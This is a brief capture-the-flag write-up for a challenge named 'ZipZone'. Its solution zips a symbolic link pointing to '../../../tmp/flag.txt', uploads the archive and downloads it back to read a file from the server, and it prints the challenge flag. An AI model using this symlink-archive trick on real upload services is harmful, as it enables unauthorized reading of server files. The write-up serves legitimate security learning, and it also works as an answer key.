# ZipZone
Solved by **yappare**

## Question
I was tired of trying to find a good file server for zip files, so I made my own! It's still a work in progress, but I think it's pretty good so far.

## Solution

```
ln -s ../../../tmp/flag.txt itik
 zip --symlinks itik.zip itik
 ```
- then upload itik.zip
- download the file from the provided UUID 
- got flag

### Flag
`CSCTF{5yml1nk5_4r3_w31rd}`
